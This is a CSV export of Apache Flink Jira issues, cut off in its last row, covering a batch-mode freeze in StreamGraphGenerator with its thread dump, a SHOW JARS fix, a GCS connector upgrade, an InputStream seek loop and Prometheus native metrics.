Summary,Issue key,Issue id,Parent id,Issue Type,Status,Project key,Project name,Project type,Project lead,Project description,Project url,Priority,Resolution,Assignee,Reporter,Creator,Created,Updated,Last Viewed,Resolved,Affects Version/s,Affects Version/s,Affects Version/s,Affects Version/s,Affects Version/s,Affects Version/s,Affects Version/s,Affects Version/s,Affects Version/s,Affects Version/s,Affects Version/s,Affects Version/s,Affects Version/s,Affects Version/s,Fix Version/s,Fix Version/s,Fix Version/s,Fix Version/s,Fix Version/s,Fix Version/s,Component/s,Component/s,Component/s,Due Date,Votes,Labels,Labels,Labels,Description,Environment,Original Estimate,Remaining Estimate,Time Spent,Work Ratio,Σ Original Estimate,Σ Remaining Estimate,Σ Time Spent,Security Level,Inward issue link (Blocker),Inward issue link (Blocker),Outward issue link (Blocker),Inward issue link (Child-Issue),Outward issue link (Child-Issue),Inward issue link (Completes),Outward issue link (Completes),Outward issue link (Container),Inward issue link (Duplicate),Inward issue link (Duplicate),Outward issue link (Duplicate),Inward issue link (Problem/Incident),Inward issue link (Problem/Incident),Outward issue link (Problem/Incident),Outward issue link (Problem/Incident),Outward issue link (Problem/Incident),Inward issue link (Reference),Inward issue link (Reference),Outward issue link (Reference),Outward issue link (Supercedes),Inward issue link (Testing),Outward issue link (Testing),Attachment,Attachment,Attachment,Attachment,Attachment,Attachment,Attachment,Attachment,Attachment,Attachment,Attachment,Attachment,Attachment,Attachment,Attachment,Attachment,Attachment,Custom field (Affects version (Component)),Custom field (Attachment count),Custom field (Blog - New Blog Administrators),Custom field (Blog - New Blog PMC),Custom field (Blog - Write access),Custom field (Blog Administrator?),Custom field (Blogs - Admin for blog),Custom field (Blogs - Email Address),Custom field (Blogs - Existing Blog Access Level),Custom field (Blogs - Existing Blog Name),Custom field (Blogs - New Blog Write Access),Custom field (Blogs - Username),Custom field (Bug Category),Custom field (Bugzilla - Email Notification Address),Custom field (Bugzilla - List of usernames),Custom field (Bugzilla - PMC Name),Custom field (Bugzilla - Project Name),Custom field (Bugzilla Id),Custom field (Bugzilla Id),Custom field (Change Category),Custom field (Complexity),Custom field (Discovered By),Custom field (Docs Text),Custom field (Enable Automatic Patch Review),Custom field (Epic Colour),Custom field (Epic Link),Custom field (Epic Name),Custom field (Epic Status),Custom field (Estimated Complexity),Custom field (Evidence Of Open Source Adoption),Custom field (Evidence Of Registration),Custom field (Evidence Of Use On World Wide Web),Custom field (Existing GitBox Approval),Custom field (External issue ID),Custom field (External issue URL),Custom field (Fix version (Component)),Custom field (Flags),Custom field (Git Notification Mailing List),Custom field (Git Repository Import Path),Custom field (Git Repository Name),Custom field (Git Repository Type),Custom field (GitHub Options),Custom field (Github Integration),Custom field (Github Integrations - Other),Custom field (Global Rank),Custom field (INFRA - Subversion Repository Path),Custom field (Initial Confluence Contributors),Custom field (Language),Custom field (Last public comment date),Custom field (Level of effort),Custom field (Machine Readable Info),Custom field (Mentor),Custom field (New-TLP-TLPName),Custom field (Original story points),Custom field (Parent Link),Custom field (Priority),Custom field (Project),Custom field (Protected Branch),Custom field (Rank),Custom field (Rank (Obsolete)),Custom field (Release Note),Custom field (Review Date),Custom field (Reviewer),Custom field (Severity),Custom field (Severity),Custom field (Skill Level),Custom field (Source Control Link),Custom field (Space Description),Custom field (Space Key),Custom field (Space Name),Custom field (Start Date),Custom field (Tags),Custom field (Target end),Custom field (Target start),Custom field (Team),Custom field (Test and Documentation Plan),Custom field (Testcase included),Custom field (Tester),Custom field (Workaround),Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment
Job in BATCH mode with a significant number of transformations freezes on method StreamGraphGenerator.existsUnboundedSource(),FLINK-32513,13542273,,Bug,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Critical,Fixed,jeyhunkarimov,vladislav.keda,vladislav.keda,03/Jul/23 09:22,08/Apr/24 06:27,04/Jun/24 20:41,22/Mar/24 13:41,1.15.3,1.16.1,1.17.1,,,,,,,,,,,,1.18.2,1.19.1,1.20.0,,,,,,,,0,pull-request-available,,,"Flink job executed in BATCH mode with a significant number of transformations (more than 30 in my case) takes very long time to start due to the method StreamGraphGenerator.existsUnboundedSource(). Also, during the execution of the method, a lot of memory is consumed, which causes the GC to fire frequently.

Thread Dump:
{code:java}
""main@1"" prio=5 tid=0x1 nid=NA runnable
  java.lang.Thread.State: RUNNABLE
      at java.util.ArrayList.addAll(ArrayList.java:702)
      at org.apache.flink.streaming.api.transformations.TwoInputTransformation.getTransitivePredecessors(TwoInputTransformation.java:224)
      at org.apache.flink.streaming.api.transformations.OneInputTransformation.getTransitivePredecessors(OneInputTransformation.java:174)
      at org.apache.flink.streaming.api.transformations.OneInputTransformation.getTransitivePredecessors(OneInputTransformation.java:174)
      at org.apache.flink.streaming.api.transformations.OneInputTransformation.getTransitivePredecessors(OneInputTransformation.java:174)
      at org.apache.flink.streaming.api.transformations.OneInputTransformation.getTransitivePredecessors(OneInputTransformation.java:174)
      at org.apache.flink.streaming.api.transformations.OneInputTransformation.getTransitivePredecessors(OneInputTransformation.java:174)
      at org.apache.flink.streaming.api.transformations.OneInputTransformation.getTransitivePredecessors(OneInputTransformation.java:174)
      at org.apache.flink.streaming.api.transformations.OneInputTransformation.getTransitivePredecessors(OneInputTransformation.java:174)
      at org.apache.flink.streaming.api.transformations.PartitionTransformation.getTransitivePredecessors(PartitionTransformation.java:95)
      at org.apache.flink.streaming.api.transformations.TwoInputTransformation.getTransitivePredecessors(TwoInputTransformation.java:223)
      at org.apache.flink.streaming.api.transformations.OneInputTransformation.getTransitivePredecessors(OneInputTransformation.java:174)
      at org.apache.flink.streaming.api.transformations.OneInputTransformation.getTransitivePredecessors(OneInputTransformation.java:174)
      at org.apache.flink.streaming.api.transformations.OneInputTransformation.getTransitivePredecessors(OneInputTransformation.java:174)
      at org.apache.flink.streaming.api.transformations.OneInputTransformation.getTransitivePredecessors(OneInputTransformation.java:174)
      at org.apache.flink.streaming.api.transformations.OneInputTransformation.getTransitivePredecessors(OneInputTransformation.java:174)
      at org.apache.flink.streaming.api.transformations.OneInputTransformation.getTransitivePredecessors(OneInputTransformation.java:174)
      at org.apache.flink.streaming.api.transformations.OneInputTransformation.getTransitivePredecessors(OneInputTransformation.java:174)
      at org.apache.flink.streaming.api.transformations.PartitionTransformation.getTransitivePredecessors(PartitionTransformation.java:95)
      at org.apache.flink.streaming.api.transformations.TwoInputTransformation.getTransitivePredecessors(TwoInputTransformation.java:223)
      at org.apache.flink.streaming.api.transformations.OneInputTransformation.getTransitivePredecessors(OneInputTransformation.java:174)
      at org.apache.flink.streaming.api.transformations.OneInputTransformation.getTransitivePredecessors(OneInputTransformation.java:174)
      at org.apache.flink.streaming.api.transformations.OneInputTransformation.getTransitivePredecessors(OneInputTransformation.java:174)
      at org.apache.flink.streaming.api.transformations.OneInputTransformation.getTransitivePredecessors(OneInputTransformation.java:174)
      at org.apache.flink.streaming.api.transformations.OneInputTransformation.getTransitivePredecessors(OneInputTransformation.java:174)
      at org.apache.flink.streaming.api.transformations.OneInputTransformation.getTransitivePredecessors(OneInputTransformation.java:174)
      at org.apache.flink.streaming.api.transformations.PartitionTransformation.getTransitivePredecessors(PartitionTransformation.java:95)
      at org.apache.flink.streaming.api.transformations.TwoInputTransformation.getTransitivePredecessors(TwoInputTransformation.java:224)
      at org.apache.flink.streaming.api.transformations.OneInputTransformation.getTransitivePredecessors(OneInputTransformation.java:174)
      at org.apache.flink.streaming.api.transformations.OneInputTransformation.getTransitivePredecessors(OneInputTransformation.java:174)
      at org.apache.flink.streaming.api.transformations.OneInputTransformation.getTransitivePredecessors(OneInputTransformation.java:174)
      at org.apache.flink.streaming.api.transformations.OneInputTransformation.getTransitivePredecessors(OneInputTransformation.java:174)
      at org.apache.flink.streaming.api.transformations.OneInputTransformation.getTransitivePredecessors(OneInputTransformation.java:174)
      at org.apache.flink.streaming.api.transformations.OneInputTransformation.getTransitivePredecessors(OneInputTransformation.java:174)
      at org.apache.flink.streaming.api.transformations.PartitionTransformation.getTransitivePredecessors(PartitionTransformation.java:95)
      at org.apache.flink.streaming.api.transformations.TwoInputTransformation.getTransitivePredecessors(TwoInputTransformation.java:224)
      at org.apache.flink.streaming.api.transformations.OneInputTransformation.getTransitivePredecessors(OneInputTransformation.java:174)
      at org.apache.flink.streaming.api.transformations.OneInputTransformation.getTransitivePredecessors(OneInputTransformation.java:174)
      at org.apache.flink.streaming.api.transformations.OneInputTransformation.getTransitivePredecessors(OneInputTransformation.java:174)
      at org.apache.flink.streaming.api.transformations.OneInputTransformation.getTransitivePredecessors(OneInputTransformation.java:174)
      at org.apache.flink.streaming.api.transformations.OneInputTransformation.getTransitivePredecessors(OneInputTransformation.java:174)
      at org.apache.flink.streaming.api.transformations.OneInputTransformation.getTransitivePredecessors(OneInputTransformation.java:174)
      at org.apache.flink.streaming.api.transformations.OneInputTransformation.getTransitivePredecessors(OneInputTransformation.java:174)
      at org.apache.flink.streaming.api.transformations.PartitionTransformation.getTransitivePredecessors(PartitionTransformation.java:95)
      at org.apache.flink.streaming.api.transformations.TwoInputTransformation.getTransitivePredecessors(TwoInputTransformation.java:223)
      at org.apache.flink.streaming.api.transformations.OneInputTransformation.getTransitivePredecessors(OneInputTransformation.java:174)
      at org.apache.flink.streaming.api.transformations.OneInputTransformation.getTransitivePredecessors(OneInputTransformation.java:174)
      at org.apache.flink.streaming.api.transformations.OneInputTransformation.getTransitivePredecessors(OneInputTransformation.java:174)
      at org.apache.flink.streaming.api.transformations.OneInputTransformation.getTransitivePredecessors(OneInputTransformation.java:174)
      at org.apache.flink.streaming.api.transformations.OneInputTransformation.getTransitivePredecessors(OneInputTransformation.java:174)
      at org.apache.flink.streaming.api.transformations.OneInputTransformation.getTransitivePredecessors(OneInputTransformation.java:174)
      at org.apache.flink.streaming.api.transformations.PartitionTransformation.getTransitivePredecessors(PartitionTransformation.java:95)
      at org.apache.flink.streaming.api.transformations.TwoInputTransformation.getTransitivePredecessors(TwoInputTransformation.java:224)
      at org.apache.flink.streaming.api.transformations.OneInputTransformation.getTransitivePredecessors(OneInputTransformation.java:174)
      at org.apache.flink.streaming.api.transformations.OneInputTransformation.getTransitivePredecessors(OneInputTransformation.java:174)
      at org.apache.flink.streaming.api.transformations.OneInputTransformation.getTransitivePredecessors(OneInputTransformation.java:174)
      at org.apache.flink.streaming.api.transformations.OneInputTransformation.getTransitivePredecessors(OneInputTransformation.java:174)
      at org.apache.flink.streaming.api.transformations.OneInputTransformation.getTransitivePredecessors(OneInputTransformation.java:174)
      at org.apache.flink.streaming.api.transformations.OneInputTransformation.getTransitivePredecessors(OneInputTransformation.java:174)
      at org.apache.flink.streaming.api.transformations.PartitionTransformation.getTransitivePredecessors(PartitionTransformation.java:95)
      at org.apache.flink.streaming.api.transformations.TwoInputTransformation.getTransitivePredecessors(TwoInputTransformation.java:224)
      at org.apache.flink.streaming.api.transformations.OneInputTransformation.getTransitivePredecessors(OneInputTransformation.java:174)
      at org.apache.flink.streaming.api.transformations.OneInputTransformation.getTransitivePredecessors(OneInputTransformation.java:174)
      at org.apache.flink.streaming.api.transformations.OneInputTransformation.getTransitivePredecessors(OneInputTransformation.java:174)
      at org.apache.flink.streaming.api.transformations.OneInputTransformation.getTransitivePredecessors(OneInputTransformation.java:174)
      at org.apache.flink.streaming.api.transformations.OneInputTransformation.getTransitivePredecessors(OneInputTransformation.java:174)
      at org.apache.flink.streaming.api.transformations.OneInputTransformation.getTransitivePredecessors(OneInputTransformation.java:174)
      at org.apache.flink.streaming.api.transformations.PartitionTransformation.getTransitivePredecessors(PartitionTransformation.java:95)
      at org.apache.flink.streaming.api.transformations.TwoInputTransformation.getTransitivePredecessors(TwoInputTransformation.java:224)
      at org.apache.flink.streaming.api.transformations.OneInputTransformation.getTransitivePredecessors(OneInputTransformation.java:174)
      at org.apache.flink.streaming.api.transformations.OneInputTransformation.getTransitivePredecessors(OneInputTransformation.java:174)
      at org.apache.flink.streaming.api.transformations.OneInputTransformation.getTransitivePredecessors(OneInputTransformation.java:174)
      at org.apache.flink.streaming.api.transformations.OneInputTransformation.getTransitivePredecessors(OneInputTransformation.java:174)
      at org.apache.flink.streaming.api.transformations.OneInputTransformation.getTransitivePredecessors(OneInputTransformation.java:174)
      at org.apache.flink.streaming.api.transformations.OneInputTransformation.getTransitivePredecessors(OneInputTransformation.java:174)
      at org.apache.flink.streaming.api.transformations.OneInputTransformation.getTransitivePredecessors(OneInputTransformation.java:174)
      at org.apache.flink.streaming.api.transformations.PartitionTransformation.getTransitivePredecessors(PartitionTransformation.java:95)
      at org.apache.flink.streaming.api.transformations.TwoInputTransformation.getTransitivePredecessors(TwoInputTransformation.java:223)
      at org.apache.flink.streaming.api.transformations.OneInputTransformation.getTransitivePredecessors(OneInputTransformation.java:174)
      at org.apache.flink.streaming.api.transformations.OneInputTransformation.getTransitivePredecessors(OneInputTransformation.java:174)
      at org.apache.flink.streaming.api.transformations.OneInputTransformation.getTransitivePredecessors(OneInputTransformation.java:174)
      at org.apache.flink.streaming.api.transformations.OneInputTransformation.getTransitivePredecessors(OneInputTransformation.java:174)
      at org.apache.flink.streaming.api.transformations.OneInputTransformation.getTransitivePredecessors(OneInputTransformation.java:174)
      at org.apache.flink.streaming.api.transformations.OneInputTransformation.getTransitivePredecessors(OneInputTransformation.java:174)
      at org.apache.flink.streaming.api.transformations.PartitionTransformation.getTransitivePredecessors(PartitionTransformation.java:95)
      at org.apache.flink.streaming.api.transformations.TwoInputTransformation.getTransitivePredecessors(TwoInputTransformation.java:224)
      at org.apache.flink.streaming.api.transformations.OneInputTransformation.getTransitivePredecessors(OneInputTransformation.java:174)
      at org.apache.flink.streaming.api.transformations.OneInputTransformation.getTransitivePredecessors(OneInputTransformation.java:174)
      at org.apache.flink.streaming.api.transformations.OneInputTransformation.getTransitivePredecessors(OneInputTransformation.java:174)
      at org.apache.flink.streaming.api.transformations.OneInputTransformation.getTransitivePredecessors(OneInputTransformation.java:174)
      at org.apache.flink.streaming.api.transformations.OneInputTransformation.getTransitivePredecessors(OneInputTransformation.java:174)
      at org.apache.flink.streaming.api.transformations.OneInputTransformation.getTransitivePredecessors(OneInputTransformation.java:174)
      at org.apache.flink.streaming.api.transformations.PartitionTransformation.getTransitivePredecessors(PartitionTransformation.java:95)
      at org.apache.flink.streaming.api.transformations.TwoInputTransformation.getTransitivePredecessors(TwoInputTransformation.java:224)
      at org.apache.flink.streaming.api.transformations.OneInputTransformation.getTransitivePredecessors(OneInputTransformation.java:174)
      at org.apache.flink.streaming.api.transformations.OneInputTransformation.getTransitivePredecessors(OneInputTransformation.java:174)
      at org.apache.flink.streaming.api.graph.StreamGraphGenerator.lambda$existsUnboundedSource$1(StreamGraphGenerator.java:509)
      at org.apache.flink.streaming.api.graph.StreamGraphGenerator$$Lambda$1988.1989814391.test(Unknown Source:-1)
      at java.util.stream.MatchOps$1MatchSink.accept(MatchOps.java:90)
      at java.util.ArrayList$ArrayListSpliterator.tryAdvance(ArrayList.java:1632)
      at java.util.stream.ReferencePipeline.forEachWithCancel(ReferencePipeline.java:127)
      at java.util.stream.AbstractPipeline.copyIntoWithCancel(AbstractPipeline.java:502)
      at java.util.stream.AbstractPipeline.copyInto(AbstractPipeline.java:488)
      at java.util.stream.AbstractPipeline.wrapAndCopyInto(AbstractPipeline.java:474)
      at java.util.stream.MatchOps$MatchOp.evaluateSequential(MatchOps.java:230)
      at java.util.stream.MatchOps$MatchOp.evaluateSequential(MatchOps.java:196)
      at java.util.stream.AbstractPipeline.evaluate(AbstractPipeline.java:234)
      at java.util.stream.ReferencePipeline.anyMatch(ReferencePipeline.java:528)
      at org.apache.flink.streaming.api.graph.StreamGraphGenerator.existsUnboundedSource(StreamGraphGenerator.java:506)
      at org.apache.flink.streaming.api.graph.StreamGraphGenerator.shouldExecuteInBatchMode(StreamGraphGenerator.java:487)
      at org.apache.flink.streaming.api.graph.StreamGraphGenerator.generate(StreamGraphGenerator.java:313)
      at org.apache.flink.streaming.api.environment.StreamExecutionEnvironment.getStreamGraph(StreamExecutionEnvironment.java:2248)
      at org.apache.flink.streaming.api.environment.StreamExecutionEnvironment.getStreamGraph(StreamExecutionEnvironment.java:2239)
      at org.apache.flink.streaming.api.environment.StreamExecutionEnvironment.getStreamGraph(StreamExecutionEnvironment.java:2225)
      at org.apache.flink.streaming.api.environment.StreamExecutionEnvironment.execute(StreamExecutionEnvironment.java:2052){code}","All modes (local, k8s session, k8s application, ...)

Flink 1.15.3
Flink 1.16.1
Flink 1.17.1",,,,,,,,,,,,,,,,,,,,,,FLINK-35009,,,,,,,,,"10/Jul/23 14:26;vladislav.keda;image-2023-07-10-17-26-46-544.png;https://issues.apache.org/jira/secure/attachment/13061188/image-2023-07-10-17-26-46-544.png",,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Mon Apr 08 06:24:18 UTC 2024,,,,,,,,,,"0|z1ixig:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"05/Jul/23 03:04;huwh;Thanks [~vladislav.keda] reporting this. Could you provide the job topology to help reproduce it?;;;","10/Jul/23 14:29;vladislav.keda;Hi [~huwh] , this job is automatically generated by our config file parser. So I can't give you Flink code example, but I can give you a pseudo description of the task topology:

The job graph consists of a Kafka Source, 20 consecutive ""Nodes"" and a Kafka Sink. Each ""Node"" represents 3 transformations shown in the picture.
!image-2023-07-10-17-26-46-544.png|width=493,height=264!;;;","23/Nov/23 16:07;vladislav.keda;Hi [~huwh]! I would like to ask if there are any news on this issue?;;;","22/Dec/23 02:42;zhuzh;The problem happens because the {{getTransitivePredecessors()}} of {{TwoInputTransformation}} is not properly implemented. If the two inputs share the same upstream node, that node will be visited twice. It results in a 2^N(N = number of TwoInputTransformation) time cost to iterate and space cost to store the predecessors.
A possible solution can be adding a cache of predecessors for each Transformation and using LinkedHashSet to deduplicate the predecessors.
Note that a few other transformations can lead to the same problem too, e.g. UnionTransformation, AbstractMultipleInputTransformation.;;;","22/Mar/24 13:41;zhuzh;master: 8dcb0ae9063b66af1d674b7b0b3be76b6d752692
release-1.19: 5ec4bf2f18168001b5cbb9012f331d3405228516
release-1.18: 940b3bbda5b10abe3a41d60467d33fd424c7dae6;;;","04/Apr/24 12:16;martijnvisser;[~zhuzh] [~jeyhunkarimov] I'm seeing tests for the Flink Kafka connector weekly builds fail on Flink 1.19-SNAPSHOT with:

{code:java}
Error:  Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.8.0:testCompile (default-testCompile) on project flink-connector-kafka: Compilation failure: Compilation failure: 
Error:  /home/runner/work/flink-connector-kafka/flink-connector-kafka/flink-connector-kafka/src/test/java/org/apache/flink/streaming/connectors/kafka/testutils/DataGenerators.java:[214,24] org.apache.flink.streaming.connectors.kafka.testutils.DataGenerators.InfiniteStringsGenerator.MockTransformation is not abstract and does not override abstract method getTransitivePredecessorsInternal() in org.apache.flink.api.dag.Transformation
Error:  /home/runner/work/flink-connector-kafka/flink-connector-kafka/flink-connector-kafka/src/test/java/org/apache/flink/streaming/connectors/kafka/testutils/DataGenerators.java:[220,44] getTransitivePredecessors() in org.apache.flink.streaming.connectors.kafka.testutils.DataGenerators.InfiniteStringsGenerator.MockTransformation cannot override getTransitivePredecessors() in org.apache.flink.api.dag.Transformation
Error:    overridden method is final
{code}

Example: https://github.com/apache/flink-connector-kafka/actions/runs/8494349338/job/23269406762#step:15:167

Looking at getTransitivePredecessors, it seems that it was changed in an incompatible way with this PR. Can you double check, and fix this in Flink itself? ;;;","04/Apr/24 12:48;jeyhunkarimov;Hi [~martijnvisser]  Thanks for reporting it. Would it be possible to fix it in kafka connector side, to make it compatible with releases 1.18 and 1.19?;;;","04/Apr/24 13:31;martijnvisser;[~jeyhunkarimov] That shouldn't be our starting point, especially since this change has also been introduced in patch version. Meaning that all custom connectors that users have built, could suddenly also no longer work with a patch version. We could also potentially have to update all externalized connectors, who might depend on this interface. Our starting point should be introduce non-breaking changes. Specifics may very based on the interface annotation. ;;;","04/Apr/24 13:33;martijnvisser;I've filed FLINK-35009 for this issue, and linked it to this issue;;;","08/Apr/24 06:24;zhuzh;{{Transformation}} is not a public interface, it is an @Internal class. Ideally, kafka connectors should not directly manipulate {{Transformation}}.
Yet we may try to find a workaround to avoid break existing kafka connectors.;;;",,,,,,,,,,,,,
SHOW JARS should not show the jars for temporary function,FLINK-32512,13542248,,Bug,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Minor,Fixed,zjureel,zjureel,zjureel,03/Jul/23 06:01,19/Oct/23 05:40,04/Jun/24 20:41,19/Oct/23 05:40,1.19.0,,,,,,,,,,,,,,1.19.0,,,,,,Table SQL / Gateway,,,,0,auto-deprioritized-major,pull-request-available,,"According to https://nightlies.apache.org/flink/flink-docs-master/docs/dev/table/sql/show/#show-jars, `SHOW JARS` should only list the jars added by `ADD JAR` statement, but currently it also show the jars for `CREATE TEMPORARY FUNCTION`",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Thu Oct 19 05:38:47 UTC 2023,,,,,,,,,,"0|z1ixcw:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"10/Sep/23 22:35;flink-jira-bot;I am the [Flink Jira Bot|https://github.com/apache/flink-jira-bot/] and I help the community manage its development. I see this issues has been marked as Major but is unassigned and neither itself nor its Sub-Tasks have been updated for 60 days. I have gone ahead and added a ""stale-major"" to the issue"". If this ticket is a Major, please either assign yourself or give an update. Afterwards, please remove the label or in 7 days the issue will be deprioritized.
;;;","18/Sep/23 22:35;flink-jira-bot;This issue was labeled ""stale-major"" 7 days ago and has not received any updates so it is being deprioritized. If this ticket is actually Major, please raise the priority and ask a committer to assign you the issue or revive the public discussion.
;;;","19/Oct/23 05:38;guoyangze;master: c2e14ff411e806f9ccf176c85eb8249b8ff12e56;;;",,,,,,,,,,,,,,,,,,,,
Upgrade GCS connector to 2.2.15,FLINK-32511,13542244,,Improvement,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,jjayadeep,jjayadeep,jjayadeep,03/Jul/23 04:33,27/Jul/23 14:27,04/Jun/24 20:41,04/Jul/23 08:10,1.17.1,,,,,,,,,,,,,,1.18.0,,,,,,FileSystems,,,,0,pull-request-available,,,"Upgrade the GCS Connector bundled in the Flink distro from version 2.2.11 to 2.2.15. The new release contains multiple bug fixes and enhancements discussed in the Release Notes| [https://github.com/GoogleCloudDataproc/hadoop-connectors/blob/v2.2.15/gcs/CHANGES.md]] . Notable changes include: 
 * Improved traceability 
 * Experimental support for read and write via GRPC",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Tue Jul 04 08:10:46 UTC 2023,,,,,,,,,,"0|z1ixc0:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"04/Jul/23 08:10;martijnvisser;Fixed in:

apache/flink:master f6d09c5c0182767243d6628fb257ddd0a93482e4;;;",,,,,,,,,,,,,,,,,,,,,,
Reusing the LongHashJoinGenerator and HashJoinFusionCodegenSpec code as much as possible to avoid too high maintain cost,FLINK-32510,13542211,13532997,Sub-task,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,,,lsy,lsy,02/Jul/23 07:54,02/Jul/23 07:55,04/Jun/24 20:41,,,,,,,,,,,,,,,,,,,,,,Table SQL / Runtime,,,,0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,2023-07-02 07:54:48.0,,,,,,,,,,"0|z1ix4o:",9223372036854775807,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
avoid using skip in InputStreamFSInputWrapper.seek,FLINK-32509,13542202,,Bug,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Minor,,,lbqin,lbqin,01/Jul/23 14:49,07/Sep/23 22:35,04/Jun/24 20:41,,1.18.0,,,,,,,,,,,,,,,,,,,,API / Core,,,,0,auto-deprioritized-major,pull-request-available,,"The implementation of  InputStream does not return -1  for eof.

The java doc of InputStream said ""The skip method may, for a variety of reasons, end up skipping over some smaller number of bytes, possibly 0."" 

For FileInputStream, it allows skipping any number of bytes past the end of the file.

So the method ""seek"" of InputStreamFSInputWrapper will cause infinite loop if 
desired exceed end of file
 
I reproduced with following case
 
{code:java}
byte[] bytes = ""flink"".getBytes();

try (InputStream inputStream = new ByteArrayInputStream(bytes)){ 
    InputStreamFSInputWrapper wrapper = new InputStreamFSInputWrapper(inputStream); 
    wrapper.seek(20); 
} {code}
I  found an issue of commons-io talks about the problem of skip
https://issues.apache.org/jira/browse/IO-203

 ",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Thu Sep 07 22:35:14 UTC 2023,,,,,,,,,,"0|z1ix2o:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"30/Aug/23 22:35;flink-jira-bot;I am the [Flink Jira Bot|https://github.com/apache/flink-jira-bot/] and I help the community manage its development. I see this issues has been marked as Major but is unassigned and neither itself nor its Sub-Tasks have been updated for 60 days. I have gone ahead and added a ""stale-major"" to the issue"". If this ticket is a Major, please either assign yourself or give an update. Afterwards, please remove the label or in 7 days the issue will be deprioritized.
;;;","07/Sep/23 22:35;flink-jira-bot;This issue was labeled ""stale-major"" 7 days ago and has not received any updates so it is being deprioritized. If this ticket is actually Major, please raise the priority and ask a committer to assign you the issue or revive the public discussion.
;;;",,,,,,,,,,,,,,,,,,,,,
Flink-Metrics Prometheus - Native Histograms / Native Counters,FLINK-32508,13542147,,New Feature,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,,liangtl,ryanvanhuuksloot,ryanvanhuuksloot,30/Jun/23 20:21,19/Aug/23 22:34,04/Jun/24 20:41,,,,,,,,,,,,,,,,,,,,,,Runtime / Metrics,,,,0,pull-request-available,stale-assigned,,"There are new metric types in Prometheus that would allow for the exporter to write Counters and Histograms as Native metrics in prometheus (vs writing as Gauges). This requires an update to the Prometheus Client which has changed it's spec.

To accommodate the new metric types while retaining the old option for prometheus metrics, the recommendation is to *Add a new package such as `flink-metrics-prometheus-native` and eventually deprecate the original.*

Discussed more on the mailing list: https://lists.apache.org/thread/kbo3973whb8nj5xvkpvhxrmgtmnbkhlv",,1209600,1209600,,0%,1209600,1209600,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Sat Aug 19 22:34:56 UTC 2023,,,,,,,,,,"0|z1iwqg:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"07/Jul/23 08:12;liangtl;Happy to take a look at this, can I please be assigned this?;;;","07/Jul/23 12:02;martijnvisser;[~liangtl] I've assigned it to you, but I thought [~ryanvanhuuksloot] also offered to volunteer. Perhaps you can work together on this?;;;","07/Jul/23 12:10;ryanvanhuuksloot;I don’t have time to work on this until the week of the 17th or 24th. Happy to collaborate.;;;","07/Jul/23 12:22;liangtl;[~martijnvisser]  Sounds great! Always happy to collaborate :D There was some pretty good suggestions on the mailing list thread! https://lists.apache.org/thread/kbo3973whb8nj5xvkpvhxrmgtmnbkhlv;;;","19/Aug/23 22:34;flink-jira-bot;I am the [Flink Jira Bot|https://github.com/apache/flink-jira-bot/] and I help the community manage its development. I see this issue is assigned but has not received an update in 30 days, so it has been labeled ""stale-assigned"".
If you are still working on the issue, please remove the label and add a comment updating the community on your progress.  If this issue is waiting on feedback, please consider this a reminder to the committer/reviewer. Flink is a very active project, and so we appreciate your patience.
If you are no longer working on the issue, please unassign yourself so someone else may work on it.
;;;",,,,,,,,,,,,,,,,,,
Document KafkaSink SinkWriterMetricGroup metrics,FLINK-32507,13542140,,Improvement,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
